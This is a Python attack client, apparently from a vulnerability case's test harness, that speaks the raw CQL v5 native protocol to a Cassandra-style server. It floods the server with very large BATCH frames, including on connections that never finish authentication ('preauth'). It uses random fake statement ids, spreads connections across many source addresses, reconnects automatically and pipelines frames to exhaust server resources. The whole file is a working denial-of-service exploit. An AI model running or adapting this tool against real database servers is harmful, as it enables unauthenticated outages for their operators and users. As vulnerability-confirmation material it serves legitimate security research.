#!/usr/bin/env python3
"""R13 stage 3-b confirm attack client (2026-11-23), from the case's harness/client.py (stage 2). Raw CQL native protocol
v5 (segments, uncompressed), standard library only. Changes against stage 2's client.py:
  --auth preauth          STARTUP -> expect AUTHENTICATE, never answer it; send BATCH frames on the unauthenticated
                          connection (the 3-b claim "pre-auth")
  --auth login:USER:PW    STARTUP -> AUTHENTICATE -> AUTH_RESPONSE (SASL PLAIN, framed) -> AUTH_SUCCESS
  (no --auth)             stage 2 behaviour (expects READY; AllowAllAuthenticator)
  --fake-id               no PREPARE: every statement carries one random 16-byte id (os.urandom), no schema needed
  --reconnect             on a closed/reset connection: log it, open a new connection (same source address), go on
  --ips K                 connection i binds to source address index i % K (default: own address per connection)
  --arm PS --depth D      single-frame variant of P: 456 statements (body 130,881 B, one self-contained segment),
                          D envelopes pipelined per connection (stream ids), a reader thread counts responses
Arms T, C, P, Cp as stage 2 (case file section 2.4). Connection i binds to 127.1.(j // 250).(1 + j % 250), j = i or i % K.
Logs: DIR/completions-<tag>.txt (t_ms conn latency_ms status ...) and DIR/client-<tag>.txt (per second:
t_ms open established outstanding completed errors K_client sent_first reconnects). PS arm: no per-response lines; the
per-second line counts responses, and DIR/status-<tag>.txt holds the status counts at the end.
"""
import argparse, io, os, socket, struct, sys, threading, time, zlib

HOST, PORT = '127.0.0.1', 9042
OP_ERROR, OP_STARTUP, OP_READY, OP_AUTHENTICATE, OP_QUERY, OP_RESULT, OP_PREPARE, OP_BATCH = 0x00, 0x01, 0x02, 0x03, 0x07, 0x08, 0x09, 0x0D
OP_AUTH_RESPONSE, OP_AUTH_SUCCESS = 0x0F, 0x10
NCOLS = 50
T_N = 55_000
PS_N = 456
C_N, C_BLOB = 64, 246_599
KS = 'r13'
STMT_T = 'INSERT INTO %s.t (k, c, %s) VALUES (%s)' % (KS, ', '.join('v%02d' % i for i in range(NCOLS)),
                                                     ', '.join(['?'] * (NCOLS + 2)))
STMT_C = 'INSERT INTO %s.big (k, c, v) VALUES (?, ?, ?)' % KS
MAXP = 128 * 1024 - 1
CRC24_INIT, CRC24_POLY = 0x875060, 0x1974F0B
CRC32_INITIAL = zlib.crc32(b'\xfa\x2d\x55\xca')


def stmt_for(arm):
    return STMT_C if arm in ('C', 'Cp') else STMT_T


def crc24(data, length=3):
    crc = CRC24_INIT
    for _ in range(length):
        crc ^= (data & 0xff) << 16
        data >>= 8
        for _ in range(8):
            crc <<= 1
            if crc & 0x1000000:
                crc ^= CRC24_POLY
    return crc


def seg_encode(env):
    """envelope bytes -> list of segment byte strings (3 parts per segment: header, payload, crc)"""
    mv = memoryview(env); n = len(env)
    parts = [mv[i:i + MAXP] for i in range(0, n, MAXP)] if n > MAXP else [mv]
    sc = len(parts) == 1
    out = []
    for p in parts:
        hd = len(p) | ((1 << 17) if sc else 0)
        out.append(hd.to_bytes(3, 'little') + crc24(hd).to_bytes(3, 'little'))
        out.append(p)
        out.append((zlib.crc32(p, CRC32_INITIAL) & 0xffffffff).to_bytes(4, 'little'))
    return out


def envelope(op, body, stream=0):
    return struct.pack('>BBhBi', 0x05, 0, stream, op, len(body)) + body


def lstr(s):
    b = s.encode(); return struct.pack('>i', len(b)) + b


def sstr(s):
    b = s.encode(); return struct.pack('>H', len(b)) + b


def recvn(sock, n):
    buf = bytearray(n); mv = memoryview(buf); got = 0
    while got < n:
        r = sock.recv_into(mv[got:], n - got)
        if r == 0:
            raise ConnectionError('closed')
        got += r
    return bytes(buf)


def src_addr(i, ips):
    j = i % ips if ips else i
    return '127.1.%d.%d' % (j // 250, 1 + j % 250)


class Conn:
    def __init__(self, i, timeout=60, auth=None, ips=0):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.bind((src_addr(i, ips), 0))
        s.settimeout(timeout)
        s.connect((HOST, PORT))
        self.s = s; self.buf = b''; self.stage = None
        body = struct.pack('>H', 1) + sstr('CQL_VERSION') + sstr('3.0.0')
        s.sendall(envelope(OP_STARTUP, body))           # unframed
        h = recvn(s, 9)
        ver, fl, st, op, ln = struct.unpack('>BBhBi', h)
        b = recvn(s, ln) if ln else b''
        if op == OP_READY:
            self.stage = 'ready'
            if auth not in (None, ''):
                raise RuntimeError('startup: READY although --auth %s (server does not require authentication)' % auth)
            return
        if op != OP_AUTHENTICATE:
            raise RuntimeError('startup: op %d %s' % (op, err_text(b) if op == 0 else ''))
        self.authenticator = b[2:2 + struct.unpack_from('>H', b)[0]].decode()
        if auth == 'preauth':
            self.stage = 'authenticating'           # never answer the challenge
            return
        if not auth or not auth.startswith('login:'):
            raise RuntimeError('startup: AUTHENTICATE (%s) and no credentials' % self.authenticator)
        _, user, pw = auth.split(':', 2)
        tok = b'\0' + user.encode() + b'\0' + pw.encode()
        self.send(envelope(OP_AUTH_RESPONSE, struct.pack('>i', len(tok)) + tok))   # framed (v5 pipeline is set)
        op, b = self.recv()
        if op != OP_AUTH_SUCCESS:
            raise RuntimeError('auth: op %d %s' % (op, err_text(b) if op == 0 else ''))
        self.stage = 'ready'

    def send(self, env):
        self.s.sendall(b''.join(seg_encode(env)))

    def recv(self, with_stream=False):
        """read segments until one complete envelope is buffered; return (op, body) or (op, body, stream)"""
        while True:
            if len(self.buf) >= 9:
                ln = struct.unpack_from('>i', self.buf, 5)[0]
                if len(self.buf) >= 9 + ln:
                    flags = self.buf[1]; op = self.buf[4]; stream = struct.unpack_from('>h', self.buf, 2)[0]
                    body = self.buf[9:9 + ln]; self.buf = self.buf[9 + ln:]
                    if flags & 0x02: body = body[16:]
                    if flags & 0x08:
                        n = struct.unpack_from('>H', body)[0]; p = 2
                        for _ in range(n):
                            l = struct.unpack_from('>H', body, p)[0]; p += 2 + l
                        body = body[p:]
                    return (op, body, stream) if with_stream else (op, body)
            h = recvn(self.s, 6)
            hd = int.from_bytes(h[:3], 'little')
            if crc24(hd) != int.from_bytes(h[3:], 'little'):
                raise RuntimeError('bad header crc')
            pl = hd & MAXP
            p = recvn(self.s, pl + 4)
            self.buf += p[:pl]

    def query(self, q):
        self.send(envelope(OP_QUERY, lstr(q) + struct.pack('>Hi', 1, 0)))
        op, b = self.recv()
        if op == OP_ERROR:
            raise RuntimeError(err_text(b))
        return b

    def prepare(self, q):
        self.send(envelope(OP_PREPARE, lstr(q) + struct.pack('>i', 0)))
        op, b = self.recv()
        if op != OP_RESULT or struct.unpack_from('>i', b)[0] != 4:
            raise RuntimeError('prepare: op %d %s' % (op, err_text(b) if op == 0 else ''))
        l = struct.unpack_from('>H', b, 4)[0]
        return b[6:6 + l]

    def close(self):
        try: self.s.close()
        except Exception: pass


def err_text(body):
    try:
        code = struct.unpack_from('>i', body)[0]; l = struct.unpack_from('>H', body, 4)[0]
        return '0x%04x:%s' % (code, body[6:6 + l].decode('utf-8', 'replace')[:160].replace(' ', '_'))
    except Exception:
        return 'unparsable_error_body'


def build_template(arm, sid):
    """-> (bytearray body, key offsets of the first partition, key offsets of the second partition)"""
    out = io.BytesIO(); offs1 = []; offs2 = []
    idb = struct.pack('>H', len(sid)) + sid
    if arm in ('T', 'P', 'PS'):
        n = PS_N if arm == 'PS' else T_N
        vals = b''.join(struct.pack('>i', 1) + b'\x01' for _ in range(NCOLS))
        out.write(struct.pack('>BH', 0x00, n))
        for j in range(n):
            out.write(b'\x01' + idb + struct.pack('>H', NCOLS + 2) + struct.pack('>i', 4))
            (offs2 if (arm in ('P', 'PS') and j >= n // 2) else offs1).append(out.tell())
            out.write(struct.pack('>i', 0) + struct.pack('>ii', 4, j) + vals)
    else:
        n = C_N
        blob = (bytes(range(256)) * 964)[:C_BLOB]
        out.write(struct.pack('>BH', 0x00, n))
        for j in range(n):
            out.write(b'\x01' + idb + struct.pack('>H', 3) + struct.pack('>i', 4))
            (offs2 if (arm == 'Cp' and j >= n // 2) else offs1).append(out.tell())
            out.write(struct.pack('>i', 0) + struct.pack('>ii', 4, j) + struct.pack('>i', C_BLOB) + blob)
    out.write(struct.pack('>Hi', 0x0001, 0))
    return bytearray(out.getvalue()), offs1, offs2


class Stats:
    def __init__(self):
        self.lock = threading.Lock(); self.open = 0; self.est = 0; self.out = 0; self.done = 0; self.err = 0; self.sf = 0
        self.rc = 0; self.status = {}

    def count(self, s):
        k = s[:90]
        self.status[k] = self.status.get(k, 0) + 1


def connect(i, a):
    c = Conn(i, auth=a.auth, ips=a.ips)
    sid = None
    if not a.fake_id:
        sid = c.prepare(stmt_for(a.arm))
    c.s.settimeout(None)
    return c, sid


def drain_error(c, timeout=2.0):
    """after a send failure: read an error frame the server may have written before closing"""
    try:
        c.s.settimeout(timeout)
        op, b = c.recv()
        return 'ERR:' + err_text(b) if op == OP_ERROR else 'op%d' % op
    except Exception as e:
        return 'none(%s)' % str(e)[:40].replace(' ', '_')


def worker(i, a, st, tmpl, stop, comp, go):
    try:
        with st.lock: st.open += 1
        c, sid = connect(i, a)
        with st.lock: st.est += 1
    except Exception as e:
        with st.lock: st.err += 1; st.open -= 1; st.count('connect_error:' + str(e)[:80])
        comp.write('%d %d -1 connect_error:%s\n' % (time.time() * 1000, i, str(e)[:160].replace(' ', '_')))
        return
    go.wait()
    if not a.fake_id and sid != tmpl['sid']:
        comp.write('%d %d -1 statement_id_differs\n' % (time.time() * 1000, i)); return
    if a.arm == 'PS':
        return pipelined(i, a, st, tmpl, stop, comp, c)
    body = bytearray(tmpl['body']); offs1, offs2 = tmpl['o1'], tmpl['o2']
    hdr = struct.pack('>BBhBi', 0x05, 0, 0, OP_BATCH, len(body))
    seq = 0
    while not stop.is_set():
        k = 1_000_000 * (i + 1) + seq; seq += 1
        for o in offs1: struct.pack_into('>i', body, o, k)
        for o in offs2: struct.pack_into('>i', body, o, k + 500_000)
        segs = seg_encode(hdr + body)
        ts = time.time(); first = False; stage = 'first'
        try:
            with st.lock: st.out += 1
            c.s.sendall(b''.join(segs[:3]))
            with st.lock: st.sf += 1
            first = True; stage = 'rest'
            if a.last_delay > 0:
                c.s.sendall(b''.join(segs[3:-3])); time.sleep(a.last_delay); c.s.sendall(b''.join(segs[-3:]))
            else:
                c.s.sendall(b''.join(segs[3:]))
            stage = 'recv'
            op, b = c.recv()
            status = 'VOID' if op == OP_RESULT else ('ERR:' + err_text(b) if op == OP_ERROR else 'op%d' % op)
        except Exception as e:
            srv = drain_error(c) if stage != 'recv' else '-'
            status = 'io_error@%s:%s|server:%s' % (stage, str(e)[:60].replace(' ', '_'), srv)
            with st.lock:
                st.out -= 1; st.err += 1; st.count(status)
                if first: st.sf -= 1
            comp.write('%d %d %d %s k=%d\n' % (time.time() * 1000, i, (time.time() - ts) * 1000, status, k))
            c.close()
            if not a.reconnect or stop.is_set():
                break
            while not stop.is_set():
                try:
                    c, _ = connect(i, a)
                    with st.lock: st.rc += 1
                    break
                except Exception as e2:
                    with st.lock: st.count('reconnect_error:' + str(e2)[:60])
                    comp.write('%d %d -1 reconnect_error:%s\n' % (time.time() * 1000, i, str(e2)[:100].replace(' ', '_')))
                    time.sleep(0.5)
            continue
        with st.lock:
            st.out -= 1; st.sf -= 1; st.count(status)
            if status == 'VOID': st.done += 1
            else: st.err += 1
        comp.write('%d %d %d %s k=%d\n' % (time.time() * 1000, i, (time.time() - ts) * 1000, status, k))
    c.close()


def pipelined(i, a, st, tmpl, stop, comp, c):
    """PS arm: D single-frame BATCH envelopes in flight per connection; reader thread counts responses."""
    body = bytearray(tmpl['body']); offs1, offs2 = tmpl['o1'], tmpl['o2']
    sem = threading.Semaphore(a.depth); dead = threading.Event()

    def reader():
        while not stop.is_set():
            try:
                op, b, s = c.recv(with_stream=True)
            except Exception as e:
                with st.lock: st.count('reader_end:' + str(e)[:60])
                dead.set(); return
            status = 'VOID' if op == OP_RESULT else ('ERR:' + err_text(b) if op == OP_ERROR else 'op%d' % op)
            with st.lock:
                st.out -= 1; st.count(status)
                if status == 'VOID': st.done += 1
                else: st.err += 1
            sem.release()
    threading.Thread(target=reader, daemon=True).start()
    seq = 0
    while not stop.is_set() and not dead.is_set():
        if not sem.acquire(timeout=0.5):
            continue
        k = 1_000_000 * (i + 1) + seq
        for o in offs1: struct.pack_into('>i', body, o, k)
        for o in offs2: struct.pack_into('>i', body, o, k + 500_000)
        env = struct.pack('>BBhBi', 0x05, 0, seq % a.depth, OP_BATCH, len(body)) + body
        seq += 1
        try:
            with st.lock: st.out += 1
            c.s.sendall(b''.join(seg_encode(env)))
        except Exception as e:
            with st.lock: st.out -= 1; st.err += 1; st.count('send_error:' + str(e)[:60])
            comp.write('%d %d -1 send_error:%s seq=%d\n' % (time.time() * 1000, i, str(e)[:100].replace(' ', '_'), seq))
            break
    comp.write('%d %d -1 pipeline_end sent=%d dead=%s\n' % (time.time() * 1000, i, seq, dead.is_set()))
    c.close()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--arm', choices=['T', 'C', 'P', 'Cp', 'PS']); ap.add_argument('--conn-start', type=int, default=0)
    ap.add_argument('--conn-n', type=int, default=1); ap.add_argument('--hold-s', type=int, default=150)
    ap.add_argument('--out', default='.'); ap.add_argument('--tag', default='p0')
    ap.add_argument('--last-delay', type=float, default=0.0)
    ap.add_argument('--auth', default=None); ap.add_argument('--fake-id', action='store_true')
    ap.add_argument('--reconnect', action='store_true'); ap.add_argument('--ips', type=int, default=0)
    ap.add_argument('--depth', type=int, default=32)
    ap.add_argument('--bodylen', action='store_true')
    a = ap.parse_args()
    if a.bodylen:
        print('arm body_bytes offs1 offs2 segments')
        for arm in ('T', 'C', 'P', 'Cp', 'PS'):
            body, o1, o2 = build_template(arm, b'\0' * 16)
            print(arm, len(body), len(o1), len(o2), len(seg_encode(envelope(OP_BATCH, bytes(body)))) // 3)
        return 0
    os.makedirs(a.out, exist_ok=True)
    comp = open(os.path.join(a.out, 'completions-%s.txt' % a.tag), 'a', buffering=1)
    clog = open(os.path.join(a.out, 'client-%s.txt' % a.tag), 'a', buffering=1)
    st = Stats(); stop = threading.Event(); go = threading.Event(); tmpl = {}
    clog.write('# start %s arm=%s conns=%d..%d auth=%s fake_id=%s reconnect=%s ips=%s depth=%s last_delay=%s pid=%d\n' % (
        time.strftime('%Y-%m-%dT%H:%M:%S%z'), a.arm, a.conn_start, a.conn_start + a.conn_n - 1,
        (a.auth or '-').split(':')[0] + (':' + a.auth.split(':')[1] if a.auth and a.auth.startswith('login:') else ''),
        a.fake_id, a.reconnect, a.ips or 'own', a.depth, a.last_delay, os.getpid()))
    threads = [threading.Thread(target=worker, args=(i, a, st, tmpl, stop, comp, go), daemon=True)
               for i in range(a.conn_start, a.conn_start + a.conn_n)]
    for t in threads: t.start()
    dl = time.time() + 120
    while time.time() < dl:
        with st.lock:
            if st.est + st.err >= a.conn_n: break
        time.sleep(0.2)
    if a.fake_id:
        sid = os.urandom(16)
    else:
        c = Conn(a.conn_start + 5000, auth=a.auth, ips=a.ips)
        sid = c.prepare(stmt_for(a.arm)); c.close()
    body, o1, o2 = build_template(a.arm, sid)
    tmpl.update(body=body, o1=o1, o2=o2, sid=sid)
    B = len(body)
    clog.write('# established=%d body=%d offs=%d/%d id=%s at %d\n' % (st.est, B, len(o1), len(o2), sid.hex(), time.time() * 1000))

    def sampler():
        while not stop.is_set():
            with st.lock:
                clog.write('%d %d %d %d %d %d %d %d %d\n' % (time.time() * 1000, st.open, st.est, st.out, st.done, st.err,
                                                             st.out * B, st.sf, st.rc))
            time.sleep(1)
    threading.Thread(target=sampler, daemon=True).start()
    go.set()
    dl = time.time() + a.hold_s
    while time.time() < dl:
        if not any(t.is_alive() for t in threads):
            clog.write('# all connections ended at %d\n' % (time.time() * 1000)); break
        time.sleep(0.5)
    stop.set()
    clog.write('# end %d done=%d err=%d reconnects=%d\n' % (time.time() * 1000, st.done, st.err, st.rc))
    with open(os.path.join(a.out, 'status-%s.txt' % a.tag), 'w') as f:
        for k, v in sorted(st.status.items(), key=lambda x: -x[1]):
            f.write('%d %s\n' % (v, k))
    time.sleep(1.2)
    return 0


if __name__ == '__main__':
    sys.exit(main())
